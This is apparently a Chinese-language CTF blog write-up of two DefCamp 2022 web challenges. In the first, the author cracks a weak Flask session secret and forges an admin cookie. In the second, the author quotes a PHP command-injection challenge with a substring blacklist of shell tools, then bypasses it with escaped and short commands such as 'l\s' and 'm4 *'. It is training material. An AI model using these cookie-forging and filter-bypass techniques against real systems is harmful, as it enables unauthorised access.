---
title: "defcampCTF2022 Wp"
slug: "defcampctf2022-wp"
description: "懒狗附体，想复现的时候环境都关了，所以只有两道题"
date: 2022-02-17T01:09:02+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

其余的看wp云了

https://dctf21.cyberedu.ro/#challenges

https://ctftime.org/event/1560/tasks/

http://www.yongsheng.site/2022/02/14/DefCamp%20CTF(D-CTF)2021-22%20web/

## web-intro

> Are you an admin?
>
> Note: **Access Denied** is part of the challenge.
>
> 34.159.7.96:32291

首页就是403，cookie部分是flask session

```bash
$ python3 flask_session_cookie_manager3.py decode -c 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI'
b'{"logged_in":false}'
```

但是不知道secret-key是啥，用c-jwt-cracker，爆了很久没爆出来key，换flask-unsign

```
flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI"
```

特别快就跑出来了。。。key是`password`，把false改为true即可，注意t要大写！

```
flask-unsign --sign --cookie "{'logged_in':True}" --secret 'password'
```

eyJsb2dnZWRfaW4iOnRydWV9.Yg0uRg.9__6dvOpRJAfT_xO1SeU_jNk3CQ

这个故事告诉我们不能用c-jwt-cracker，快跑！！！

## para-code

> I do not think that this API needs any sort of security testing as it only executes and retrieves the output of ID and PS commands.
>
> 34.159.129.6:32136

```php
<?php
require __DIR__ . '/flag.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
}

$blackList = array(
  'ss','sc','aa','od','pr','pw','pf','ps','pa','pd','pp','po','pc','pz','pq','pt','pu','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','pf','pz','pv','pw','px','py','pq','pk','pj','pl','pm','pn','pq','ls','dd','nl','nk','df','wc', 'du'
);

$valid = true;
foreach($blackList as $blackItem)
{
    if(strpos($_GET['start'], $blackItem) !== false)
    {
         $valid = false;
         break;
    }
}

if(!$valid)
{
  show_source(__FILE__);
  exit;
}

// This will return output only for id and ps.
if (strlen($_GET['start']) < 5){
  echo shell_exec($_GET['start']);
} else {
  echo "Please enter a valid command";
}

if (False) {
  echo $flag;
}

?>


```

一看这个代码以为致敬[HitconCTF 2017]babyfirst-revenge，不过多了blacklist

然后试了半天发现好像不太行，黑名单太多了导致用那种方式完全做不了，也没有考虑其它角度 就放弃了

看了wp之后才发现我是小丑，tmd

```
/?start=l\s	# flag.php index.php
/?start=m4 *
```

用到的m4命令，之前完全没用过……所以也没想到

![image-20220217013744152](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220217013744152.png)

------

最近做题和学习中明显地发现了自己的不足之处，就是动手太少了，觉得脑子能记住能理解，但实际情况往往就不是这么一回事，你不动手做就是不会，就是不知道中间的坑点在哪里，这样畏手畏脚地是绝对走不远的，也会让自己很难受

时刻提醒自己，要脚踏实地的学，认真一些